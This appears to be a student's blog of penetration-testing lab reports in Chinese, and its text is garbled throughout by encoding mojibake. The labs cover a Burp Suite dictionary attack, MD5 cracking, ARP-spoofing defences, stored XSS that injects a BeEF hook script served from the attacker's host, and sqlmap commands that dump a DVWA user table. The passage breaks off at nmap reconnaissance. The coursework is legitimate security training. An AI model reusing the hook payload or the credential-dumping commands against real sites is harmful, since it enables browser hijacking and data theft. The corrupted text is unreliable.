href="#ç½‘ç«™å¯†ç ç ´è§£éƒ¨åˆ†ï¼š" class="headerlink" title="ç½‘ç«™å¯†ç ç ´è§£éƒ¨åˆ†ï¼š"></a>ç½‘ç«™å¯†ç ç ´è§£éƒ¨åˆ†ï¼š</h3><p>ä»¥ xxxx ä¸ºç›®æ ‡ç½‘ç«™ï¼Œæ„é€ å­—å…¸ï¼ˆwordlistï¼‰ï¼Œå…¶ä¸­åŒ…å«ä½ çš„æ­£ç¡®å¯†ç ï¼Œåˆ©ç”¨ burpsuite è¿›è¡Œå­—å…¸æ”»å‡»ï¼Œå®æ–½å­—å…¸æ”»å‡»ï¼Œä½ æ˜¯å¦‚ä½•åˆ¤æ–­æŸä¸ªå¯†ç ä¸ºç ´è§£å¾—åˆ°çš„æ­£ç¡®å¯†ç ï¼Œæˆªå›¾ã€‚</p><ul><li>è¿™é‡Œæ‰¾åˆ°äº†åŸæ¥æ­çš„<code>pikachu</code>é¶åœºï¼Œæ¡Œé¢æ–°å»º<code>list.txt</code>ï¼Œé‡Œé¢å­˜æœ‰ä¸€äº›å¯†ç ï¼Œæ¯”å¦‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">000000</span><br><span class="line">abc123</span><br></pre></td></tr></table></figure><p>å¼€ burpsuite æŠ“åŒ…ï¼Œsend to inturder ï¼Œpayload é¡µé¢ç‚¹ load å¯¼å…¥æ¡Œé¢çš„<code>list.txt</code>ï¼Œå¼€å§‹çˆ†ç ´</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182535.png"></p><p>æ­£ç¡®å¯†ç æˆ–è€…ç‰¹æ®Šå¯†ç çš„é•¿åº¦ä¼šä¸åŒï¼Œæ‰€ä»¥åˆ¤æ–­<code>abc123</code>å°±æ˜¯å¯†ç </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182627.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182747.png"></p><h3 id="MD5ç ´è§£éƒ¨åˆ†ï¼š"><a href="#MD5ç ´è§£éƒ¨åˆ†ï¼š" class="headerlink" title="MD5ç ´è§£éƒ¨åˆ†ï¼š"></a>MD5ç ´è§£éƒ¨åˆ†ï¼š</h3><p>SqlMapå¾—åˆ°æŸæ•°æ®åº“ç”¨æˆ·è¡¨ä¿¡æ¯ï¼Œç”¨æˆ·å£ä»¤çš„MD5å€¼ä¸º7282C5050CFE7DF5E09A33CA456B94AE</p><p>é‚£ä¹ˆï¼Œå£ä»¤çš„æ˜æ–‡æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæç¤ºï¼šMD5å€¼ç ´è§£ï¼‰</p><p>éšä¾¿æ‰¾ä¸ªåœ¨çº¿è§£å¯†ç½‘ç«™ï¼Œå¾—åˆ°æ˜æ–‡<code>iampotato</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106183031.png"></p><h3 id="John-the-Ripperçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#John-the-Ripperçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="John the Ripperçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"></a>John the Ripperçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>John æ˜¯ä¸€æ¬¾è€ç‰Œçš„æš´åŠ›ç ´è§£å¯†ç çš„å·¥å…·ï¼Œæ‹¥æœ‰è‡ªå¸¦çš„å­—å…¸ï¼Œå¯ä»¥ç”¨æ¥çˆ†ç ´ä¸€äº›ç®€å•çš„å¼±å£ä»¤å¯†ç </p><h3 id="æ€è€ƒé—®é¢˜ï¼š"><a href="#æ€è€ƒé—®é¢˜ï¼š" class="headerlink" title="æ€è€ƒé—®é¢˜ï¼š"></a>æ€è€ƒé—®é¢˜ï¼š</h3><h4 id="è°ˆè°ˆå¦‚ä½•é˜²æ­¢ARPæ”»å‡»"><a href="#è°ˆè°ˆå¦‚ä½•é˜²æ­¢ARPæ”»å‡»" class="headerlink" title="è°ˆè°ˆå¦‚ä½•é˜²æ­¢ARPæ”»å‡»"></a>è°ˆè°ˆå¦‚ä½•é˜²æ­¢ARPæ”»å‡»</h4><ul><li>é™æ€ç»‘å®šIPåœ°å€å’ŒMACåœ°å€</li><li>åŒç»‘æªæ–½ï¼Œåœ¨è·¯ç”±å™¨å’Œç»ˆç«¯ä¸Šéƒ½è¿›è¡ŒIP-MACç»‘å®šçš„æªæ–½ï¼Œå®ƒå¯ä»¥å¯¹ARPæ¬ºéª—çš„ä¸¤è¾¹ï¼Œä¼ªé€ ç½‘å…³å’Œæˆªè·æ•°æ®ï¼Œéƒ½å…·æœ‰çº¦æŸçš„ä½œç”¨ã€‚è¿™æ˜¯ä»ARPæ¬ºéª—åŸç†ä¸Šè¿›è¡Œçš„é˜²èŒƒæªæ–½ï¼Œä¹Ÿæ˜¯æœ€æ™®éåº”ç”¨çš„åŠæ³•ã€‚å®ƒå¯¹ä»˜æœ€æ™®é€šçš„ARPæ¬ºéª—æ˜¯æœ‰æ•ˆçš„</li><li>å®‰è£… ARP é˜²ç«å¢™</li></ul><h4 id="å®‰å…¨çš„å¯†ç ï¼ˆå£ä»¤ï¼‰åº”éµå¾ªçš„åŸåˆ™"><a href="#å®‰å…¨çš„å¯†ç ï¼ˆå£ä»¤ï¼‰åº”éµå¾ªçš„åŸåˆ™" class="headerlink" title="å®‰å…¨çš„å¯†ç ï¼ˆå£ä»¤ï¼‰åº”éµå¾ªçš„åŸåˆ™"></a>å®‰å…¨çš„å¯†ç ï¼ˆå£ä»¤ï¼‰åº”éµå¾ªçš„åŸåˆ™</h4><ul><li>ä¸èƒ½æ˜¯å¼±å¯†ç ï¼ˆ123456ã€adminã€rootã€88888888ï¼‰</li><li>å„ä¸ªå¹³å°çš„å¯†ç æœ‰è‡ªå·±çš„ç‰¹å¾</li><li>ä¸è¦å¸¦æœ‰è‡ªå·±çš„ç”Ÿæ—¥æˆ–è€…åå­—ç¼©å†™ç­‰å®¹æ˜“è¢«ç¤¾å·¥åˆ°çš„ä¿¡æ¯ï¼Œå¯èƒ½ä¼šè¢«ç»„åˆæˆå¯†ç å­—å…¸è¿›è¡Œçˆ†ç ´</li></ul><h4 id="è°ˆè°ˆå­—å…¸æ”»å‡»ä¸­å­—å…¸çš„é‡è¦æ€§"><a href="#è°ˆè°ˆå­—å…¸æ”»å‡»ä¸­å­—å…¸çš„é‡è¦æ€§" class="headerlink" title="è°ˆè°ˆå­—å…¸æ”»å‡»ä¸­å­—å…¸çš„é‡è¦æ€§"></a>è°ˆè°ˆå­—å…¸æ”»å‡»ä¸­å­—å…¸çš„é‡è¦æ€§</h4><ul><li>ä¸€ä¸ªå¼±å£ä»¤å­—å…¸å¸¸å¸¸æ˜¯æ‰“å¼€æ¸—é€çªç ´å£çš„ç¬¬ä¸€æ­¥</li><li>é€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦ç»„åˆè€Œæˆçš„å­—å…¸æ€ä¼¤åŠ›å¾ˆå¤§ï¼Œèƒ½æé«˜å¯†ç çˆ†ç ´çš„æˆåŠŸç‡</li><li>ä¸€äº›å¯ä»¥ç”¨æ¥ fuzzing çš„å­—å…¸å¯ä»¥æµ‹è¯•ç½‘ç«™çš„ waf ï¼Œæ¯”å¦‚è¿‡æ»¤æ‰äº†å“ªäº›å­—ç¬¦ä¸²</li></ul><h4 id="å®éªŒå°ç»“"><a href="#å®éªŒå°ç»“" class="headerlink" title="å®éªŒå°ç»“"></a>å®éªŒå°ç»“</h4><p>æœ¬æ¬¡å®éªŒæœ€é‡è¦çš„å°±æ˜¯å­¦åˆ°äº† ARP åè®®å’Œ ARP æ¬ºéª—ï¼Œä»¥å‰åªæ˜¯å¬è¯´è¿‡ï¼Œè¿™å›ä»”ç»†æ‰¾èµ„æ–™å¹¶ä¸”åŠ¨æ‰‹å®è·µäº†ï¼Œå…¶æ¬¡è¿˜æ˜ç™½äº†å¯†ç çš„é‡è¦æ€§ï¼Œæœ€åæ˜¯å¯¹ Wireshark è½¯ä»¶çš„ä½¿ç”¨æ›´åŠ ç†Ÿç»ƒäº†ä¸€äº›ï¼Œæµé‡åˆ†æä¹Ÿå­¦åˆ°äº†ä¸å°‘ç®€ç»ƒçš„æ“ä½œ</p><h1 id="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸‰ï¼šXSS-å’Œ-SQL-æ³¨å…¥"><a href="#ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸‰ï¼šXSS-å’Œ-SQL-æ³¨å…¥" class="headerlink" title="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸‰ï¼šXSS å’Œ SQL æ³¨å…¥"></a>ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸‰ï¼šXSS å’Œ SQL æ³¨å…¥</h1><h2 id="å®éªŒç›®çš„-2"><a href="#å®éªŒç›®çš„-2" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h2><ul><li><p>äº†è§£ä»€ä¹ˆæ˜¯XSS</p></li><li><p>äº†è§£XSSæ”»å‡»å®æ–½ï¼Œç†è§£é˜²å¾¡XSSæ”»å‡»çš„æ–¹æ³•</p></li><li><p>äº†è§£SQLæ³¨å…¥çš„åŸºæœ¬åŸç†</p></li><li><p>æŒæ¡PHPè„šæœ¬è®¿é—®MySQLæ•°æ®åº“çš„åŸºæœ¬æ–¹æ³•</p></li><li><p>æŒæ¡ç¨‹åºè®¾è®¡ä¸­é¿å…å‡ºç°SQLæ³¨å…¥æ¼æ´çš„åŸºæœ¬æ–¹æ³•</p></li><li><p>æŒæ¡ç½‘ç«™é…ç½®ã€‚</p></li></ul><h2 id="ç³»ç»Ÿç¯å¢ƒ-2"><a href="#ç³»ç»Ÿç¯å¢ƒ-2" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h2><ul><li>Kali Linux2ã€Windows Server</li></ul><h2 id="ç½‘ç»œç¯å¢ƒ-2"><a href="#ç½‘ç»œç¯å¢ƒ-2" class="headerlink" title="ç½‘ç»œç¯å¢ƒ"></a>ç½‘ç»œç¯å¢ƒ</h2><ul><li>äº¤æ¢ç½‘ç»œç»“æ„</li></ul><h2 id="å®éªŒå·¥å…·-2"><a href="#å®éªŒå·¥å…·-2" class="headerlink" title="å®éªŒå·¥å…·"></a>å®éªŒå·¥å…·</h2><ul><li>Beef</li><li>AWVS</li><li>Sqlmap</li><li>DVWA</li></ul><h2 id="å®éªŒæ­¥éª¤-2"><a href="#å®éªŒæ­¥éª¤-2" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="XSSéƒ¨åˆ†ï¼šåˆ©ç”¨-Beef-åŠ«æŒè¢«æ”»å‡»è€…å®¢æˆ·ç«¯æµè§ˆå™¨"><a href="#XSSéƒ¨åˆ†ï¼šåˆ©ç”¨-Beef-åŠ«æŒè¢«æ”»å‡»è€…å®¢æˆ·ç«¯æµè§ˆå™¨" class="headerlink" title="XSSéƒ¨åˆ†ï¼šåˆ©ç”¨ Beef åŠ«æŒè¢«æ”»å‡»è€…å®¢æˆ·ç«¯æµè§ˆå™¨"></a>XSSéƒ¨åˆ†ï¼šåˆ©ç”¨ Beef åŠ«æŒè¢«æ”»å‡»è€…å®¢æˆ·ç«¯æµè§ˆå™¨</h3><ul><li>å®éªŒç¯å¢ƒæ­å»ºï¼š</li></ul><p>è§’è‰²ï¼šç•™è¨€ç°¿ç½‘ç«™ã€‚å­˜åœ¨XSSæ¼æ´ï¼›ï¼ˆIISæˆ–Apacheã€guestbookæ­å»ºï¼‰<br>æ”»å‡»è€…ï¼šKaliï¼ˆä½¿ç”¨beEFç”Ÿæˆæ¶æ„ä»£ç ï¼Œå¹¶é€šè¿‡ç•™è¨€æ–¹å¼æäº¤åˆ°ç•™è¨€ç°¿ç½‘ç«™ï¼‰ï¼›<br>è¢«æ”»å‡»è€…ï¼šè®¿é—®ç•™è¨€ç°¿ç½‘ç«™ï¼Œæµè§ˆå™¨è¢«åŠ«æŒã€‚</p><blockquote><p>æ­å»ºæ•™ç¨‹ç½‘ç«™ï¼š<a href="https://blog.csdn.net/qq_41865652/article/details/107459482?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160554665919725255539382%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160554665919725255539382&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-2-107459482.pc_first_rank_v2_rank_v28&utm_term=win7+asp%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA&spm=1018.2118.3001.4449">æœ¬åœ°win7ç³»ç»Ÿä¸‹ASPç½‘ç«™ç¯å¢ƒæ­å»º</a></p></blockquote><p>æ­å»ºæˆåŠŸï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117012821.png" alt="æ­å»ºæˆåŠŸ"></p><ol><li>åˆ©ç”¨ AWVS æ‰«æç•™è¨€ç°¿ç½‘ç«™ï¼Œå‘ç°å­˜åœ¨ XSS æ¼æ´ï¼Œæˆªå›¾</li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117022801.png" alt="å‘ç°æ¼æ´"></p><blockquote><p>è¿™é‡Œè¿˜çœ‹åˆ°äº†ä¸€ä¸ª <code>HTTP.sys</code>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œç¨å¾®çœ‹äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯ä¸ªäºŒè¿›åˆ¶æ¼æ´ï¼Œmetasploitå·²ç»æ”¶å½•è€Œä¸”èƒ½ç›´æ¥æŠŠå—å®³ä¸»æœºæ‰“è“å±ï¼ŒçœŸä¸é”™</p><p><a href="https://www.freebuf.com/column/202763.html">æ¯æ—¥æ¼æ´ | HTTP.sysè¿œç¨‹ä»£ç æ‰§è¡Œ</a></p><p><a href="https://www.jianshu.com/p/33569386dea9">HTTP.sysè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a></p></blockquote><ol><li>kali ä½¿ç”¨ Beef ç”Ÿæˆæ¶æ„ä»£ç ï¼Œæˆªå›¾</li></ol><blockquote><p>å¾ˆé—æ†¾ï¼Œæˆ‘çš„æ–°ç‰ˆ kali ä¾æ—§æ˜¯æ²¡æœ‰ beef ï¼Œæœæ–­é€‰æ‹©å®‰å›æ‰€æœ‰å·¥å…·</p><blockquote><p>apt-get -y install kali-linux-default #æ¸—é€æµ‹è¯•çš„åŸºæœ¬å·¥å…·<br>apt-get -y install kali-linux-large #æ›´å¹¿æ³›çš„å·¥å…·<br>apt-get -y install kali-linux-everything #æ‰€æœ‰å·¥å…·</p><blockquote><p>ç„¶åè¿˜æ˜¯æ²¡æœ‰ beef </p><p>è‡ªå·±å®‰è£…äº†ä¸€ä¸ª<code>apt-get install beef-xss</code></p></blockquote></blockquote></blockquote><p>æ‰“å¼€ beef çš„æ—¶å€™é‡åˆ°äº†ä¸€ä¸ªæŠ¥é”™ï¼Œè¯´ä¸èƒ½ä½¿ç”¨é»˜è®¤çš„è´¦å·å¯†ç ï¼ˆbeef beefï¼‰ï¼Œå»å¯¹åº”è·¯å¾„ä¸‹æ‰¾åˆ°æ–‡ä»¶è‡ªå·±æ”¹ä¸€ä¸ªæ–°çš„è´¦å·å¯†ç å°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[!] ERROR: Don&#x27;t use default username and password!</span><br><span class="line">[15:18:15]    |_  Change the beef.credentials.passwd in /etc/beef-xss/config.yaml</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117042700.png" alt="shellcode"></p><ol><li>è®¿é—® http:&#x2F;&#x2F;ç•™è¨€ç°¿ç½‘ç«™&#x2F;message.aspï¼Œå°†ä»¥ä¸‹æ¶æ„ä»£ç å†™å…¥ç½‘ç«™ç•™è¨€æ¿ï¼Œæˆªå›¾</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.17.132:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>ç®¡ç†å‘˜ç™»å½• login.htmlï¼Œè´¦å·å¯†ç å‡ä¸º adminï¼Œå®¡æ ¸ç”¨æˆ·ç•™è¨€ã€‚åªè¦å®¢æˆ·ç«¯è®¿é—®è¿™ä¸ªæœåŠ¡å™¨çš„ç•™è¨€æ¿ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨å°±ä¼šè¢«åŠ«æŒï¼ŒæŒ‡å®šè¢«åŠ«æŒç½‘ç«™ä¸ºå­¦æ ¡ä¸»é¡µï¼Œå°†ä½ åœ¨ beff ä¸­çš„é…ç½®æˆªå›¾</li></ol><blockquote><p>æ²¡æœ‰é€‰æ‹©è·³åˆ°å­¦æ ¡ä¸»é¡µï¼Œé€‰æ‹©äº†è·³åˆ°è‡ªå·±çš„åšå®¢ä¸»é¡µ</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117045535.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117050240.png" alt="blog"></p><ol start="4"><li>å›ç­”é—®é¢˜ï¼šå®éªŒä¸­ XSS æ”»å‡»å±äºå“ªç§ç±»å‹ï¼Ÿ</li></ol><blockquote><p>å­˜å‚¨å‹ XSS</p></blockquote><h3 id="SQL-æ³¨å…¥éƒ¨åˆ†ï¼šDVWA-SQLmap-Mysql-æ³¨å…¥å®æˆ˜"><a href="#SQL-æ³¨å…¥éƒ¨åˆ†ï¼šDVWA-SQLmap-Mysql-æ³¨å…¥å®æˆ˜" class="headerlink" title="SQL æ³¨å…¥éƒ¨åˆ†ï¼šDVWA + SQLmap + Mysql æ³¨å…¥å®æˆ˜"></a>SQL æ³¨å…¥éƒ¨åˆ†ï¼šDVWA + SQLmap + Mysql æ³¨å…¥å®æˆ˜</h3><ul><li>å®éªŒç¯å¢ƒæ­å»ºã€‚å¯åŠ¨ Metasploitable2 è™šæ‹Ÿæœº</li></ul><ol><li><p>åœ¨è¾“å…¥æ¡†è¾“å…¥1ï¼Œè¿”å›</p><blockquote><p>ID: 1<br>First name: admin<br>Surname: admin</p></blockquote><p>è¿”å›æ­£å¸¸ï¼›<br>å†æ¬¡è¾“å…¥1â€™ï¼ŒæŠ¥é”™ï¼Œè¿”å›</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜â€™1â€™â€™â€™ at line 1</p></blockquote><p>æ­¤æ—¶å¯ä»¥æ–­å®šæœ‰SQLæ³¨å…¥æ¼æ´ï¼Œ<br><a href="http://ipåœ°å€/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#">http://IPåœ°å€/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#</a><br>ä¸‹é¢åˆ©ç”¨SQLMapè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚å°†DVWAå®‰å…¨çº§åˆ«è®¾ç½®ä¸ºæœ€ä½ï¼›</p></li><li><p>æšä¸¾å½“å‰ä½¿ç”¨çš„æ•°æ®åº“åç§°å’Œç”¨æˆ·å</p></li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117004441.png" alt="sqlmap"></p><blockquote><p>ç”¨ sqlmap ç›´æ¥æ‰«çš„æ—¶å€™é‡åˆ°äº†ä¸ªé—®é¢˜ï¼Œå­˜åœ¨ <code>302</code> è·³è½¬é¡µé¢ï¼Œæ‰«çš„æ—¶å€™ä¼šç›´æ¥è·³å› <code>login.php</code> ç™»å½•é¡µé¢ï¼Œæ‰€ä»¥éœ€è¦åŠ  <code>cookie</code> æ¥æ‰«</p><blockquote><p>é€€å›ç™»å½•é¡µé¢ï¼ŒæŠ“åŒ…æ‹¿åˆ° cookie </p><p><code>security=low; PHPSESSID=f383161ec8314206ec01076f9b34b866</code></p></blockquote></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117032106.png" alt="302"></p><p>ä½ è¾“å…¥çš„å‘½ä»¤ï¼š</p><blockquote><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ -b â€“current-db â€“current-user </p></blockquote><p>Sqlmap è¾“å‡ºæˆªå›¾ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117033022.png"></p><ol start="3"><li>æšä¸¾æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç </li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117004609.png" alt="sqlmap"></p><p>ä½ è¾“å…¥çš„å‘½ä»¤ï¼š</p><blockquote><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ â€“users â€“password â€“batch</p></blockquote><p>Sqlmap è¾“å‡ºæˆªå›¾</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035518.png"></p><ol start="4"><li>æšä¸¾æ•°æ®åº“</li></ol><p><code>--dbs</code>ï¼šæšä¸¾æ‰€æœ‰æ•°æ®åº“</p><p>ä½ è¾“å…¥çš„å‘½ä»¤ï¼š</p><blockquote><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ â€“dbs</p></blockquote><p>Sqlmap è¾“å‡ºæˆªå›¾ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035651.png"></p><ol start="5"><li>æšä¸¾æ•°æ®åº“å’ŒæŒ‡å®šæ•°æ®åº“çš„æ•°æ®è¡¨</li></ol><p><code>-D æ•°æ®åº“å</code>ï¼šæŒ‡å®šæ•°æ®åº“</p><p><code>--tables</code>ï¼šæšä¸¾æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨</p><p>ä½ è¾“å…¥çš„å‘½ä»¤ï¼š</p><blockquote><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ -D dvwa â€“tables</p></blockquote><p>Sqlmap è¾“å‡ºæˆªå›¾ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035817.png"></p><ol start="6"><li>è·å–æŒ‡å®šæ•°æ®åº“å’Œè¡¨ä¸­æ‰€æœ‰åˆ—çš„ä¿¡æ¯</li></ol><p><code>-D æ•°æ®åº“å</code>ï¼šæŒ‡å®šçš„æ•°æ®åº“</p><p><code>-T æŒ‡å®šæ•°æ®è¡¨å</code>ï¼šæŒ‡å®šæ•°æ®åº“ä¸­çš„æ•°æ®è¡¨</p><p><code>--columns</code>ï¼šè·å–åˆ—çš„ä¿¡æ¯</p><p>ä½ è¾“å…¥çš„å‘½ä»¤ï¼š</p><blockquote><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ -D dvwa -T users â€“columns</p><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ -D dvwa -T guestbook â€“columns</p></blockquote><p>Sqlmap è¾“å‡ºæˆªå›¾ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040003.png" alt="users"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040102.png" alt="guestbook"></p><ol start="7"><li>æšä¸¾æŒ‡å®šæ•°æ®è¡¨ä¸­çš„æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ down åˆ°æœ¬åœ°</li></ol><p><code>-C æŒ‡å®šæ•°æ®è¡¨ä¸­çš„åˆ—</code>ï¼šæšä¸¾æ•°æ®è¡¨ä¸­çš„åˆ—</p><p><code>--dump</code>ï¼šå­˜å‚¨æ•°æ®è¡¨é¡¹</p><p>ä½ è¾“å…¥çš„å‘½ä»¤ï¼š</p><blockquote><p>sqlmap -u â€œ<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> â€“cookie&#x3D;â€™security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866â€™ -D dvwa -T users -C user password â€“dump</p></blockquote><p>Sqlmap è¾“å‡ºæˆªå›¾ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040932.png"></p><p>æŸ¥çœ‹ down åˆ°æœ¬åœ°çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæˆªå›¾ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117041143.png"></p><h1 id="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒå››ï¼šWebDeveloperé¶æœºrootshell"><a href="#ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒå››ï¼šWebDeveloperé¶æœºrootshell" class="headerlink" title="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒå››ï¼šWebDeveloperé¶æœºrootshell"></a>ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒå››ï¼šWebDeveloperé¶æœºrootshell</h1><p>é¦–å…ˆè‡ªç„¶æ˜¯ä¸‹è½½å¥½é¶æœºï¼Œæ”¾ VMware é‡Œï¼Œåœ¨æ­¤æ„Ÿè°¢å¤§ä½¬åŒå­¦æä¾›çš„æ ¡å†…ç½‘ç›˜ï¼Œä¸‹è½½é€Ÿåº¦å¾ˆå¿«ï¼Œå­©å­å¾ˆå–œæ¬¢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202224343.png" alt="webdeveloper"></p><p>æœ¬æ¬¡å®éªŒçš„ç½‘ç»œç¯å¢ƒæ˜¯æŠŠä¸»æ”»æ‰‹ï¼škali å’Œå—å®³ä¸»æœºï¼šWebDeveloper æ”¾åœ¨äº†åŒä¸€ä¸ªç½‘æ®µï¼Œéƒ½ç”¨ <code>NAT</code> æ¨¡å¼æ¥å…¥ç½‘ç»œ</p><p>é¶æœºå¼€å¥½äº†è‡ªç„¶æ˜¯ä¸èƒ½åŠ¨äº†ï¼Œæ¥ä¸‹æ¥å¼€ <code>nmap</code> æ‰«ä¸€æ‰«ï¼Œå…ˆæ‰«å­˜æ´»ä¸»æœºï¼Œç®€å•æ’é™¤ä¸€ä¸‹ï¼Œç¡®å®š<code>192.168.17.134</code>ä¸ºé¶æœº IP åœ°å€</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225036.png"></p><p>æ¥ç€æ‰«å¼€æ”¾ç«¯å£ï¼Œå‘ç°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼Œåˆ†åˆ«æ˜¯<code>80</code>ï¼ˆçŒœæµ‹æ˜¯webç½‘ç«™æœåŠ¡ï¼‰å’Œ<code>22</code>çš„ ssh ç«¯å£</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225245.png"></p><p>è®¿é—®ä¸€ä¸‹<code>192.168.17.134</code>ï¼Œå‘ç°æ˜¯ä¸ª <code>wordpress</code>æ­çš„ç«™ï¼Œè€ç†Ÿäººäº†</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225629.png" 